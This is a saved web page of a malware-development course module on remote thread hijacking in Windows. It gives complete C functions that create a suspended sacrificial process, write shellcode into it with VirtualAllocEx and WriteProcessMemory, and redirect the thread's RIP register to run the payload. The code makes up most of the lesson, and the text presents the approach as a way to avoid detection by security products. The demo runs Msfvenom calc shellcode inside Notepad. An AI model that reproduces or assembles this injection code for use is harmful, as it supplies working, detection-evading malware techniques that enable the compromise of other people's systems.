<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/css2.css" rel="stylesheet">
        <link href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/css2_002.css" rel="stylesheet">
        <title>Thread Hijacking - Remote Thread Creation</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 36 - Thread Hijacking - Remote Thread Creation
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/RemoteThreadHijacking" target="_blank">
                    <img src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Thread Hijacking - Remote Thread Creation</h2>
<h3>Introduction</h3>
<p>The previous module demonstrated thread hijacking on a local process 
by creating a suspended sacrificial thread that runs a benign dummy 
function and utilized its handle to execute the payload. This module 
will demonstrate the same technique against a remote process rather than
 the local process.</p>
<p>Another noticeable difference in this module is that a sacrificial 
thread will not be created in the remote process. Although that can be 
done using the <code>CreateRemoteThread</code> WinAPI call, it is a commonly abused function and therefore highly monitored by security solutions.</p>
<p>A better approach is to create a sacrificial process in a suspended state using <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank">CreateProcess</a> which will create all of its threads in a suspended state, allowing them to be hijacked.</p>
<h3>Remote Thread Hijacking Steps</h3>
<p>This section describes the required steps to perform thread hijacking on a thread residing in a remote process.</p>
<h4>CreateProcess WinAPI</h4>
<p><code>CreateProcess</code> is a powerful and important WinAPI that 
has various uses. To ensure users have a solid understanding, the 
function's important parameters are explained below.</p>
<pre><code>BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<ul>
<li>
<p>The <code>lpApplicationName</code> and <code>lpCommandLine</code> parameters represent the process name and its command line arguments, respectively. For example, <code>lpApplicationName</code> can be <code>C:\Windows\System32\cmd.exe</code> and <code>lpCommandLine</code> can be <code>/k whoami</code>. Alternatively, <code>lpApplicationName</code> can be set to <code>NULL</code> but <code>lpCommandLine</code> can have the process name and its arguments, <code>C:\Windows\System32\cmd.exe /k whoami</code>. Both parameters are marked as optional meaning a newly created process does not need to have any arguments.</p>
</li>
<li>
<p><code>dwCreationFlags</code> is the parameter that controls the 
priority class and the creation of the process. The possible values for 
this parameter can be found <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags#flags" target="_blank">here</a>. For example, using the <code>CREATE_SUSPENDED</code> flag creates the process in a suspended state.</p>
</li>
<li>
<p><code>lpStartupInfo</code> is a pointer to <a href="https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa" target="_blank">STARTUPINFO</a> which contains details related to the process creation. The only element that needs to be populated is <code>DWORD cb</code>, which is the size of the structure in bytes.</p>
</li>
<li>
<p><code>lpProcessInformation</code> is an OUT parameter that returns a <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information" target="_blank">PROCESS_INFORMATION</a> structure. The <code>PROCESS_INFORMATION</code> structure is shown below.</p>
</li>
</ul>
<pre><code>typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;        // A handle to the newly created process.
  HANDLE hThread;         // A handle to the main thread of the newly created process.
  DWORD  dwProcessId;     // Process ID
  DWORD  dwThreadId;      // Main Thread's ID    
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

</code></pre>
<h4>Using Environment Variables</h4>
<p>The last remaining piece for creating a process is determining the 
process's full path. The sacrificial process will be created from a 
binary that resides in the <code>System32</code> directory. It's possible to assume the path will be <code>C:\Windows\System32</code> and hard code that value, but it's always safer to programmatically verify the path. To do so, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea" target="_blank">GetEnvironmentVariableA</a> WinAPI will be used. <code>GetEnvironmentVariableA</code> retrieves the value of a specified environment variable which in this case will be "WINDIR".</p>
<p><code>WINDIR</code> is an environment variable that points to the 
installation directory of the Windows operating system. On most systems,
 this directory is "C:\Windows". It's possible to access the value of 
the WINDIR environment variable by typing "echo %WINDIR%" in the command
 prompt or simply typing <code>%WINDIR%</code> in the file explorer search bar.</p>
<pre><code>DWORD GetEnvironmentVariableA(
  [in, optional]  LPCSTR lpName,
  [out, optional] LPSTR  lpBuffer,
  [in]            DWORD  nSize
);
</code></pre>
<h3>Creating a Sacrificial Process Function</h3>
<p><code>CreateSuspendedProcess</code> will be used to create the sacrificial process in a suspended state. It requires 4 arguments:</p>
<ul>
<li>
<p><code>lpProcessName</code> - The name of the process to create.</p>
</li>
<li>
<p><code>dwProcessId</code> - A pointer to a DWORD which receives the process ID.</p>
</li>
<li>
<p><code>hProcess</code> - A pointer to a HANDLE that receives the process handle.</p>
</li>
<li>
<p><code>hThread</code> - A pointer to a HANDLE that receives the thread handle.</p>
</li>
</ul>
<pre><code>BOOL CreateSuspendedProcess (IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR				    lpPath          [MAX_PATH * 2];
	CHAR				    WnDr            [MAX_PATH];

	STARTUPINFO			    Si              = { 0 };
	PROCESS_INFORMATION		Pi              = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&amp;Si,					// Pointer to STARTUPINFO structure
		&amp;Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId    = Pi.dwProcessId;
	*hProcess       = Pi.hProcess;
	*hThread        = Pi.hThread;
	
	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
		return TRUE;

	return FALSE;
}
</code></pre>
<h3>Injecting Remote Process Function</h3>
<p>The next step after creating the target process is to inject the payload using the <code>InjectShellcodeToRemoteProcess</code> function from the <em>Process Injection - Shellcode</em>
 beginner module. The payload is only written to the remote process 
without being executed. The base address is then stored for later use 
via thread hijacking.</p>
<pre><code>BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten    = NULL;
	DWORD   dwOldProtection          = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

</code></pre>
<h3>Remote Thread Hijacking Function</h3>
<p>After creating the suspended process and writing the payload to the 
remote process, the final step is to use the thread handle which was 
returned by <code>CreateSuspendedProcess</code> to perform thread hijacking. This part is the same as the one demonstrated in the local thread hijacking module.</p>
<p>To recap, <code>GetThreadContext</code> is used to retrieve the thread's context, update the <code>RIP</code> register to point to the written payload, call <code>SetThreadContext</code> to update the thread's context and finally use <code>ResumeThread</code> to execute the payload. All of this is demonstrated in the custom function below, <code>HijackThread</code>, which takes two arguments:</p>
<ul>
<li>
<p><code>hThread</code> - The thread to hijack.</p>
</li>
<li>
<p><code>pAddress</code> - A pointer to the base address of the payload to be executed.</p>
</li>
</ul>
<pre><code>BOOL HijackThread (IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

 	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = pAddress;
  
	// setting the new updated thread context
	if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);
	
	WaitForSingleObject(hThread, INFINITE);
	
	return TRUE;
}
</code></pre>
<h3>Conclusion</h3>
<p>A quick recap of what was demonstrated in this module:</p>
<ol>
<li>
<p>A new process was created in a suspended state using <code>CreateProcessA</code>, which created all of its threads in a suspended state as well.</p>
</li>
<li>
<p>The payload was injected into the newly created process using <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code> but was not executed.</p>
</li>
<li>
<p>Used the thread handle returned from <code>CreateProcessA</code> to execute the payload via thread hijacking.</p>
</li>
</ol>
<h3>Demo</h3>
<p>This demo uses <code>Notepad.exe</code> as the sacrificial process, hijacks its thread and executes the Msfvenom calc shellcode.</p>
<p><img src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/rthread-hijack-108970868-ca84b0fe-ce83-447e-b7a1-4116559bc41.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Familiarize yourself with using the CreateProcessA/W WinAPI function</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement remote thread hijacking to run a 32-bit payload on a 32-bit system (Hint: update the EIP register)</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/35"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/36/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/36/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/37"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/jquery-3.6.0.min.js"></script>
        <script src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.4474f4d1.css"><link rel="modulepreload" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.5f3af5ce.js"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.4474f4d1.css"><script type="module" src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/app.5f3af5ce.js"></script><script src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/navbar.js"></script>
<script src="Thread%20Hijacking%20-%20Remote%20Thread%20Creation_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 36;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>